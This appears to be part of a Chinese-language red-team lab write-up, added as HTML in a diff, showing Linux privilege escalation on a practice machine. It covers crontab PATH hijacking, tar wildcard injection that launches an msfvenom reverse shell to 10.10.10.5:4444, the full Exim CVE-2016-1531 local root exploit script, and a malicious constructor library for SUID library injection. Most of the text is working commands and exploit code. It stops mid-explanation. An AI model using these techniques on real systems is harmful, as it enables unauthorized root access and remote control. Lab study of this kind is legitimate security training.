@@ -913,6 +913,585 @@
 </span></span><span style="display:flex;"><span>root@RedteamNotes:~# whoami
 </span></span><span style="display:flex;"><span>whoami
 </span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="自动任务-path-环境变量提权">自动任务 PATH 环境变量提权</h3>
+<p>查看自动任务，发现 crontab 的 PATH 包含了 user 的家目录。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/crontab
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h dom mon dow user  command</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>* * * * * root overwrite.sh
+</span></span><span style="display:flex;"><span>* * * * * root /usr/local/bin/compress.sh
+</span></span></code></pre></div><p>在家目录下创建一个 overwrite.sh。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ vim overwrite.sh
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat overwrite.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cp /bin/bash /tmp/rootBash2
+</span></span><span style="display:flex;"><span>chmod +xs /tmp/rootBash2
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ chmod +xs overwrite.sh 
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah
+</span></span><span style="display:flex;"><span>total 52K
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155042</span> drwxr-xr-x <span style="color:#ae81ff">4</span> user user 4.0K Jan <span style="color:#ae81ff">15</span> 10:04 .
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155041</span> drwxr-xr-x <span style="color:#ae81ff">3</span> root root 4.0K May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> ..
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155046</span> -rw------- <span style="color:#ae81ff">1</span> user user 2.3K Apr <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2023</span> .bash_history
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155045</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">220</span> May <span style="color:#ae81ff">12</span>  <span style="color:#ae81ff">2017</span> .bash_logout
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155043</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user 3.2K May <span style="color:#ae81ff">14</span>  <span style="color:#ae81ff">2017</span> .bashrc
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">375363</span> drwxr-xr-x <span style="color:#ae81ff">2</span> user user 4.0K May <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> .irssi
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">156485</span> -rw------- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">137</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .lesshst
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155047</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">212</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> myvpn.ovpn
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155048</span> -rw------- <span style="color:#ae81ff">1</span> user user   <span style="color:#ae81ff">11</span> May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> .nano_history
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155072</span> -rwsr-sr-x <span style="color:#ae81ff">1</span> user user   <span style="color:#ae81ff">66</span> Jan <span style="color:#ae81ff">15</span> 10:04 overwrite.sh
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155044</span> -rw-r--r-- <span style="color:#ae81ff">1</span> user user  <span style="color:#ae81ff">725</span> May <span style="color:#ae81ff">13</span>  <span style="color:#ae81ff">2017</span> .profile
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155049</span> drwxr-xr-x <span style="color:#ae81ff">8</span> user user 4.0K May <span style="color:#ae81ff">15</span>  <span style="color:#ae81ff">2017</span> tools
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155073</span> -rw------- <span style="color:#ae81ff">1</span> user user 3.8K Jan <span style="color:#ae81ff">15</span> 10:04 .viminfo
+</span></span></code></pre></div><p>等待自动任务执行获得 root。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ ls /tmp
+</span></span><span style="display:flex;"><span>backup.tar.gz  rootBash2
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ /tmp/rootBash2 -p
+</span></span><span style="display:flex;"><span>rootBash2-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><h3 id="自动任务通配符提权">自动任务通配符提权</h3>
+<p>查看自动任务发现每分钟自动以 <code>root</code> 身份运行脚本 <code>/usr/local/bin/compress.sh</code>，查看该脚本。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ cat /etc/crontab
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># command to install the new version when you edit this file</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># that none of the other crontabs do.</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>SHELL<span style="color:#f92672">=</span>/bin/sh
+</span></span><span style="display:flex;"><span>PATH<span style="color:#f92672">=</span>/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># m h dom mon dow user  command</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>* * * * * root overwrite.sh
+</span></span><span style="display:flex;"><span>* * * * * root /usr/local/bin/compress.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cat /usr/local/bin/compress.sh
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
+</span></span><span style="display:flex;"><span>cd /home/user
+</span></span><span style="display:flex;"><span>tar czf /tmp/backup.tar.gz *
+</span></span></code></pre></div><p>解释一下这个命令</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>tar czf /tmp/backup.tar.gz *
+</span></span></code></pre></div><ul>
+<li>c：创建新的归档文件</li>
+<li>z：通过 gzip 进行压缩生成 .tar.gz 格式的压缩文件，若不使用则会创建未压缩的 .tar 归档文件</li>
+<li>f：指定归档文件的名称为 /tmp/backup.tar.gz</li>
+<li>*：所有内容</li>
+</ul>
+<p>每分钟以 <code>root</code> 的身份将 user 家目录下的所有文件打包为 <code>/tmp/backup.tar.gz</code>。</p>
+<p>在 kali 中制作反弹 shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>10.10.10.5 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -f elf -o shell.elf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> No arch selected, selecting arch: x64 from the payload
+</span></span><span style="display:flex;"><span>No encoder specified, outputting raw payload
+</span></span><span style="display:flex;"><span>Payload size: <span style="color:#ae81ff">74</span> bytes
+</span></span><span style="display:flex;"><span>Final size of elf file: <span style="color:#ae81ff">194</span> bytes
+</span></span><span style="display:flex;"><span>Saved as: shell.elf
+</span></span></code></pre></div><p>上传至靶机。</p>
+<p><img src="Pasted%20image%2020260115231901.png" alt=""></p>
+<p>给反弹 shell 赋权并利用 touch 使用反弹 shell。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ chmod +xs shell.elf 
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ ls -liah shell.elf 
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">155063</span> -rwsr-sr-x <span style="color:#ae81ff">1</span> user user <span style="color:#ae81ff">194</span> Jan <span style="color:#ae81ff">15</span> 10:18 shell.elf
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ touch /home/user/--checkpoint<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ touch /home/user/--checkpoint-action<span style="color:#f92672">=</span>exec<span style="color:#f92672">=</span>shell.elf
+</span></span></code></pre></div><p>kali 开启监听等待反弹 shell 运行。</p>
+<h3 id="suid-可执行文件利用提权">SUID 可执行文件利用提权</h3>
+<p>查看具有 s 位的可执行文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/sudoedit
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/usr/sbin/exim-4.84-3
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/tmp/rootBash2
+</span></span><span style="display:flex;"><span>/sbin/mount.nfs
+</span></span><span style="display:flex;"><span>/home/user/overwrite.sh
+</span></span><span style="display:flex;"><span>/home/user/shell.elf
+</span></span></code></pre></div><p>发现 exim 很可疑，可能可以用于提权，使用 searchsploit 搜索一下。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit exim 4.84
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span> Exploit Title                                                        |  Path
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Exim - <span style="color:#e6db74">&#39;perl_startup&#39;</span> Local Privilege Escalation <span style="color:#f92672">(</span>Metasploit<span style="color:#f92672">)</span>         | linux/local/39702.rb
+</span></span><span style="display:flex;"><span>Exim 4.84-3 - Local Privilege Escalation                              | linux/local/39535.sh
+</span></span><span style="display:flex;"><span>Exim &lt; 4.86.2 - Local Privilege Escalation                            | linux/local/39549.txt
+</span></span><span style="display:flex;"><span>Exim &lt; 4.90.1 - <span style="color:#e6db74">&#39;base64d&#39;</span> Remote Code Execution                       | linux/remote/44571.py
+</span></span><span style="display:flex;"><span>PHPMailer &lt; 5.2.20 with Exim MTA - Remote Code Execution              | php/webapps/42221.py
+</span></span><span style="display:flex;"><span>---------------------------------------------------------------------- ---------------------------------
+</span></span><span style="display:flex;"><span>Shellcodes: No Results
+</span></span><span style="display:flex;"><span>Papers: No Results
+</span></span></code></pre></div><p>有一个版本匹配的本地提权漏洞利用脚本，下载下来看看能不能利用。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ searchsploit -m <span style="color:#ae81ff">39535</span> 
+</span></span><span style="display:flex;"><span>  Exploit: Exim 4.84-3 - Local Privilege Escalation
+</span></span><span style="display:flex;"><span>      URL: https://www.exploit-db.com/exploits/39535
+</span></span><span style="display:flex;"><span>     Path: /usr/share/exploitdb/exploits/linux/local/39535.sh
+</span></span><span style="display:flex;"><span>    Codes: CVE-2016-1531
+</span></span><span style="display:flex;"><span> Verified: True
+</span></span><span style="display:flex;"><span>File Type: POSIX shell script, ASCII text executable
+</span></span><span style="display:flex;"><span>Copied to: /home/kali/Work/Kali/39535.sh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>39535.sh  shell.elf
+</span></span><span style="display:flex;"><span>                                                                                                        
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Work/Kali<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat 39535.sh 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># CVE-2016-1531 exim &lt;= 4.84-3 local root exploit</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ===============================================</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># you can write files as root or force a perl module to</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># load by manipulating the perl environment and running</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># exim with the &#34;perl_startup&#34; arguement -ps.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># e.g.</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [fantastic@localhost tmp]$ ./cve-2016-1531.sh</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [ CVE-2016-1531 local root exploit</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># sh-4.3# id</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># uid=0(root) gid=1000(fantastic) groups=1000(fantastic)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -- Hacker Fantastic</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#f92672">[</span> CVE-2016-1531 local root exploit
+</span></span><span style="display:flex;"><span>cat &gt; /tmp/root.pm <span style="color:#e6db74">&lt;&lt; EOF
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">package root;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">use strict;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">use warnings;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">system(&#34;/bin/sh&#34;);
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">EOF</span>
+</span></span><span style="display:flex;"><span>PERL5LIB<span style="color:#f92672">=</span>/tmp PERL5OPT<span style="color:#f92672">=</span>-Mroot /usr/exim/bin/exim -ps
+</span></span></code></pre></div><p>下载利用脚本至靶机，赋予权限。</p>
+<p><img src="Pasted%20image%2020260115234353.png" alt=""></p>
+<p>利用获得 root。</p>
+<p><img src="Pasted%20image%2020260115234547.png" alt=""></p>
+<h3 id="suid-共享库注入提权">SUID 共享库注入提权</h3>
+<p>查看具有 s 位的可执行文件。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/usr/bin/chsh
+</span></span><span style="display:flex;"><span>/usr/bin/sudo
+</span></span><span style="display:flex;"><span>/usr/bin/newgrp
+</span></span><span style="display:flex;"><span>/usr/bin/sudoedit
+</span></span><span style="display:flex;"><span>/usr/bin/passwd
+</span></span><span style="display:flex;"><span>/usr/bin/gpasswd
+</span></span><span style="display:flex;"><span>/usr/bin/chfn
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env
+</span></span><span style="display:flex;"><span>/usr/local/bin/suid-env2
+</span></span><span style="display:flex;"><span>/usr/sbin/exim-4.84-3
+</span></span><span style="display:flex;"><span>/usr/lib/eject/dmcrypt-get-device
+</span></span><span style="display:flex;"><span>/usr/lib/openssh/ssh-keysign
+</span></span><span style="display:flex;"><span>/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</span></span><span style="display:flex;"><span>/usr/lib/pt_chown
+</span></span><span style="display:flex;"><span>/bin/ping6
+</span></span><span style="display:flex;"><span>/bin/ping
+</span></span><span style="display:flex;"><span>/bin/mount
+</span></span><span style="display:flex;"><span>/bin/su
+</span></span><span style="display:flex;"><span>/bin/umount
+</span></span><span style="display:flex;"><span>/tmp/rootBash2
+</span></span><span style="display:flex;"><span>/sbin/mount.nfs
+</span></span><span style="display:flex;"><span>/home/user/overwrite.sh
+</span></span><span style="display:flex;"><span>/home/user/shell.elf
+</span></span></code></pre></div><p>尝试运行分析 /usr/local/bin/suid-so 。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ /usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>Calculating something, please wait...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[=====================================================================</span>&gt;<span style="color:#f92672">]</span> <span style="color:#ae81ff">99</span> %
+</span></span><span style="display:flex;"><span>Done.
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ strings /usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>/lib64/ld-linux-x86-64.so.2
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#eGVO</span>
+</span></span><span style="display:flex;"><span>CyIk
+</span></span><span style="display:flex;"><span>libdl.so.2
+</span></span><span style="display:flex;"><span>__gmon_start__
+</span></span><span style="display:flex;"><span>_Jv_RegisterClasses
+</span></span><span style="display:flex;"><span>dlopen
+</span></span><span style="display:flex;"><span>libstdc++.so.6
+</span></span><span style="display:flex;"><span>_ZNSt8ios_base4InitD1Ev
+</span></span><span style="display:flex;"><span>_ZNSolsEPFRSoS_E
+</span></span><span style="display:flex;"><span>__gxx_personality_v0
+</span></span><span style="display:flex;"><span>_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
+</span></span><span style="display:flex;"><span>_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc
+</span></span><span style="display:flex;"><span>_ZSt4cout
+</span></span><span style="display:flex;"><span>_ZNSo5flushEv
+</span></span><span style="display:flex;"><span>_ZNSt8ios_base4InitC1Ev
+</span></span><span style="display:flex;"><span>_ZNSolsEi
+</span></span><span style="display:flex;"><span>libm.so.6
+</span></span><span style="display:flex;"><span>libgcc_s.so.1
+</span></span><span style="display:flex;"><span>libc.so.6
+</span></span><span style="display:flex;"><span>__cxa_atexit
+</span></span><span style="display:flex;"><span>__libc_start_main
+</span></span><span style="display:flex;"><span>GLIBC_2.2.5
+</span></span><span style="display:flex;"><span>CXXABI_1.3
+</span></span><span style="display:flex;"><span>GLIBCXX_3.4
+</span></span><span style="display:flex;"><span>fff.
+</span></span><span style="display:flex;"><span>fffff.
+</span></span><span style="display:flex;"><span>l$ L
+</span></span><span style="display:flex;"><span>t<span style="color:#66d9ef">$(</span>L
+</span></span><span style="display:flex;"><span>|$0H
+</span></span><span style="display:flex;"><span>Calculating something, please wait...
+</span></span><span style="display:flex;"><span>/home/user/.config/libcalc.so
+</span></span><span style="display:flex;"><span>Done.
+</span></span><span style="display:flex;"><span>Y@-C
+</span></span></code></pre></div><p>发现可能链接 /home/user/.config/libcalc.so，使用 strace 进行进一步的分析。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ strace /usr/local/bin/suid-so 2&gt;&amp;<span style="color:#ae81ff">1</span> | grep <span style="color:#e6db74">&#39;home&#39;</span>
+</span></span><span style="display:flex;"><span>open<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/home/user/.config/libcalc.so&#34;</span>, O_RDONLY<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>发现尝试打开 /home/user/.config/libcalc.so 的时候未寻找到该文件或目录，我们创建一个让他打开。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@RedteamNotes:~$ pwd
+</span></span><span style="display:flex;"><span>/home/user
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ mkdir .config
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~$ cd .config/
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~/.config$ vim libcalc.c
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~/.config$ cat libcalc.c 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>static void injetc<span style="color:#f92672">()</span> __attribute__<span style="color:#f92672">((</span>constructor<span style="color:#f92672">))</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>void injetc<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>        setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>        system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/bin/bash -p&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c
+</span></span><span style="display:flex;"><span>gcc: libcalc.c: No such file or directory
+</span></span><span style="display:flex;"><span>gcc: no input files
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~/.config$ mv libcalc.so libcalc.c
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~/.config$ gcc -shared -fPIC -o libcalc.so libcalc.c
+</span></span><span style="display:flex;"><span>user@RedteamNotes:~/.config$ /usr/local/bin/suid-so
+</span></span><span style="display:flex;"><span>Calculating something, please wait...
+</span></span><span style="display:flex;"><span>bash-4.1# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>解释一下这个 c 程序。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">injetc</span>() <span style="color:#a6e22e">__attribute__</span>((constructor));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">injetc</span>() {
